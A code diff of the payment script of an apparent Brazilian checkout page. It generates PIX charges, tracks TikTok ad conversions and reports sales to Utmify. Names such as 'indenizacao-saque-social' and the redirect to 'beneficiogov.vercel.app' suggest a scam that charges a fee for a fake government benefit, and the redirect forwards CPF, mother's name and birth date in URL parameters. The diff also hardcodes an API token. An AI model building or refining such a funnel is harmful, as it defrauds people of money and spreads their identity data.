@@ -301,12 +301,14 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   var PIX_REDIRECT      = 'https://beneficiogov.vercel.app/up1.html';
 
   // ─── UTMIFY — Postback URL ──────────────────────────────────────────────────
-  // A Paradise chama esta URL automaticamente quando o pagamento é aprovado.
-  // A Utmify recebe o postback e registra a venda nas campanhas.
-  // Formato: https://api.utmify.com.br/api-credentials/orders?platform=other&token=SEU_TOKEN
-  // Substitua SEU_TOKEN_UTMIFY pelo token da sua conta na Utmify
-  // (Utmify → Configurações → API → Token de Integração)
+  // A Paradise chama esta URL quando o pagamento for aprovado → Utmify registra a venda
   var UTMIFY_POSTBACK_URL = 'https://api.utmify.com.br/api-credentials/orders?platform=other&token=ghRVhTRxLXJKyhUjsCV8fCTO903rL7JaRobk';
+
+  // ─── PARADISE — Hash do Produto ─────────────────────────────────────────────
+  // ⚠️ OBRIGATÓRIO para a Utmify funcionar corretamente
+  // Encontre em: Paradise → Produtos → clique no produto → copie o "Hash do Produto"
+  // Exemplo: 'prod_abc123xyz'
+  var PARADISE_PRODUCT_HASH = 'prod_2a4957d43af8f54d';
   // ============================================================================
 
   var _pixCode           = '';
@@ -340,9 +342,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   if (nomeOk) document.getElementById('header-user-name').textContent = nomeOk.split(' ')[0];
 
   // ===================================================
-  // TIKTOK PIXEL — eventos com valor correto
-  // Usa o pixel nativo (D6VJ0Q3C77UCSLHQUES0) para marcar
-  // as conversões dentro das campanhas do TikTok Ads
+  // TIKTOK PIXEL
   // ===================================================
   function ttqIdentify() {
     try {
@@ -352,67 +352,44 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       if (Object.keys(d).length) ttq.identify(d);
     } catch(e) {}
   }
-
-  // Dados de produto — valor correto em BRL para o TikTok rastrear ROAS
   function ttqConteudo() {
     return {
       content_id:   'saque-social',
       content_name: PIX_DESCRICAO,
       content_type: 'product',
       currency:     'BRL',
-      value:        parseFloat((PIX_VALOR_CENTS / 100).toFixed(2)), // valor real em reais
+      value:        parseFloat((PIX_VALOR_CENTS / 100).toFixed(2)),
       quantity:     1
     };
   }
-
-  // ViewContent: usuário viu a página de pagamento
   function ttqViewContent() {
-    try {
-      ttq.track('ViewContent', ttqConteudo());
-      console.log('[TTQ] ViewContent ✓ valor=R$' + (PIX_VALOR_CENTS/100).toFixed(2));
-    } catch(e) {}
+    try { ttq.track('ViewContent', ttqConteudo()); console.log('[TTQ] ViewContent ✓'); } catch(e) {}
   }
-
-  // InitiateCheckout: PIX foi gerado (dispara 1x por sessão)
   function ttqInitiateCheckout() {
     if (_checkoutDisparado) return;
     _checkoutDisparado = true;
-    try {
-      ttq.track('InitiateCheckout', ttqConteudo());
-      console.log('[TTQ] InitiateCheckout ✓');
-    } catch(e) {}
+    try { ttq.track('InitiateCheckout', ttqConteudo()); console.log('[TTQ] InitiateCheckout ✓'); } catch(e) {}
   }
-
-  // AddPaymentInfo: usuário copiou o código PIX
   function ttqAddPaymentInfo() {
-    try {
-      ttq.track('AddPaymentInfo', ttqConteudo());
-      console.log('[TTQ] AddPaymentInfo ✓');
-    } catch(e) {}
+    try { ttq.track('AddPaymentInfo', ttqConteudo()); console.log('[TTQ] AddPaymentInfo ✓'); } catch(e) {}
   }
-
-  // Purchase: pagamento confirmado — evento mais importante para o TikTok Ads
-  // Inclui transaction_id para deduplicação e evitar contagem dupla
   function ttqPurchase() {
     try {
-      var purchaseData = {
-        content_id:      'indenizacao-saque-social',
-        content_name:    PIX_DESCRICAO,
-        content_type:    'product',
-        currency:        'BRL',
-        value:           parseFloat((PIX_VALOR_CENTS / 100).toFixed(2)),
-        quantity:        1,
-        transaction_id:  String(_pixTxid) // ID único da Paradise — evita duplicatas no TikTok
-      };
-      ttq.track('Purchase', purchaseData);
+      ttq.track('Purchase', {
+        content_id:     'saque-social',
+        content_name:   PIX_DESCRICAO,
+        content_type:   'product',
+        currency:       'BRL',
+        value:          parseFloat((PIX_VALOR_CENTS / 100).toFixed(2)),
+        quantity:       1,
+        transaction_id: String(_pixTxid) // evita contagem dupla no TikTok Ads
+      });
       console.log('[TTQ] Purchase ✓ valor=R$' + (PIX_VALOR_CENTS/100).toFixed(2) + ' txid=' + _pixTxid);
     } catch(e) {}
   }
 
   // ===================================================
   // GERA PIX — PARADISE PAGS
-  // postback_url → Paradise chama a Utmify automaticamente
-  // quando o pagamento é aprovado (sem precisar de polling)
   // ===================================================
   async function pixIniciar() {
     document.getElementById('pix-loading').style.display = 'block';
@@ -435,12 +412,12 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         amount:       PIX_VALOR_CENTS,
         description:  PIX_DESCRICAO,
         reference:    gerarReference(),
-        source:       'api_externa',
-        // ─── POSTBACK UTMIFY ─────────────────────────────────────────────
-        // A Paradise faz POST nesta URL quando o pagamento for aprovado.
-        // A Utmify recebe e registra a venda automaticamente nas campanhas.
+        // ─── productHash: obrigatório para Utmify registrar a venda ──────────
+        // Com productHash a Paradise envia o postback_url com os dados corretos
+        // do produto → Utmify vincula à campanha certa
+        productHash:  PARADISE_PRODUCT_HASH,
         postback_url: UTMIFY_POSTBACK_URL,
-        // ─────────────────────────────────────────────────────────────────
+        // ─────────────────────────────────────────────────────────────────────
         customer: {
           name:     nomeEnvio,
           email:    emailEnvio,
@@ -528,15 +505,26 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         if (s.status === 'approved') {
           clearInterval(_pixTimer);
           clearInterval(_timerInterval);
+          console.log('✅ PAGAMENTO APROVADO — redirecionando para:', PIX_REDIRECT);
 
-          // ✅ Dispara Purchase com transaction_id para deduplicação no TikTok
+          // ✅ TikTok Purchase com transaction_id para deduplicação
           ttqPurchase();
 
-          // Aguarda 800ms para garantir envio do evento antes do redirect
+          // Monta URL de redirect repassando TODOS os parâmetros da URL atual
           setTimeout(function() {
-            var params = new URLSearchParams(window.location.search);
-            var redirectUrl = PIX_REDIRECT + (PIX_REDIRECT.indexOf('?') > -1 ? '&' : '?') + params.toString();
-            window.location.href = redirectUrl;
+            try {
+              var base   = new URL(PIX_REDIRECT);
+              var params = new URLSearchParams(window.location.search);
+              // Repassa nome, cpf, mae, nascimento, utms, etc.
+              params.forEach(function(value, key) {
+                base.searchParams.set(key, value);
+              });
+              console.log('Redirect final:', base.toString());
+              window.location.href = base.toString();
+            } catch(e) {
+              // fallback simples se URL inválida
+              window.location.href = PIX_REDIRECT;
+            }
           }, 800);
         }
       } catch(e) { console.error('Polling erro tentativa ' + tentativas + ':', e); }
